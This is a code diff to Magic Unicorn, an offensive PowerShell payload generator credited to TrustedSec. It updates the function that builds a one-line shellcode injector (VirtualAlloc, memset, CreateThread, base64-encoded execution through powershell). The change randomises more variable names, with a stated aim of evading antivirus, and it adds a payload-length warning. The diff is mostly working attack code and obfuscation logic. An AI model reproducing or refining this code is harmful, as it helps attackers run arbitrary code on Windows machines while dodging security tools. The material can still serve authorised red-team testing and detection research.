@@ -178,7 +178,7 @@ def cert_help():
     print("""
 [*******************************************************************************************************]
 
-				-----CERUTIL Attack Instruction----
+				-----CERTUTIL Attack Instruction----
 
 The certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take
 a binary file, move it into a base64 format and use certutil on the victim machine to convert it back to
@@ -218,7 +218,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 # usage banner
 def gen_usage():
     print(
-        "-------------------- Magic Unicorn Attack Vector v2.8.1 -----------------------------")
+        "-------------------- Magic Unicorn Attack Vector v2.8.2 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print(
         "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
@@ -470,21 +470,26 @@ def gen_shellcode_attack(payload, ipaddr, port):
 
     # added random vars before and after to change strings - AV you are
     # seriously ridiculous.
-    var1 = generate_random_string(2, 3)
-    var2 = generate_random_string(2, 3)
-    var3 = generate_random_string(2, 3)
-    var4 = generate_random_string(2, 3)
-    var5 = generate_random_string(2, 3)
-    var6 = generate_random_string(2, 3)
-    var7 = "$" + generate_random_string(2, 3)
-    var8 = "$" + generate_random_string(2, 3)
+    var1 = "$" + generate_random_string(2, 3) # $1 
+    var2 = "$" + generate_random_string(2, 3) # $c
+    var3 = "$" + generate_random_string(2, 3) # $2
+    var4 = "$" + generate_random_string(2, 3) # $3
+    var5 = "$" + generate_random_string(2, 3) # $x
+    var6 = "$" + generate_random_string(2, 3) # $t
+    var7 = "$" + generate_random_string(2, 3) # $h
+    var8 = "$" + generate_random_string(2, 3) # $z
+    var9 = "$" + generate_random_string(2, 3) # $g
+    var10 = "$" + generate_random_string(2, 3) # $i
+    var11 = "$" + generate_random_string(2, 3) # $w
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (r"""$1 = '%s = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition %s -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';%s = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-e''c ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 %s"}else{;iex "& powershell $2 %s";}""" % (var8,var8,shellcode,var7,var7,var7))
+    powershell_code = (r"""$1 = '$t = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $t -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-sleep 60};';$h = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-e''c ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $h"}else{;iex "& powershell $2 $h";}""" % (shellcode))
 
     # run it through a lame var replace
-    powershell_code = powershell_code.replace("$1", "$" + var1).replace("$c", "$" + var2).replace(
-        "$2", "$" + var3).replace("$3", "$" + var4).replace("$x", "$" + var5)
+    powershell_code = powershell_code.replace("$1", var1).replace("$c", var2).replace(
+        "$2", var3).replace("$3", var4).replace("$x", var5).replace("$t", var6).replace(
+        "$h", var7).replace("$z", var8).replace("$g", var9).replace("$i", var10).replace(
+        "$w", var11)
 
     return powershell_code
 
@@ -543,6 +548,9 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             hta_help()
 
         else:  # write out powershell attacks
+            if len(full_attack) > 8191:
+                print("[!] WARNING. WARNING. Length of the payload is above command line limit length of 8191. Recommend trying to generate again or the line will be cut off.")
+                raw_input("Press {return} to continue.")
             write_file("powershell_attack.txt", full_attack)
             ps_help()
 
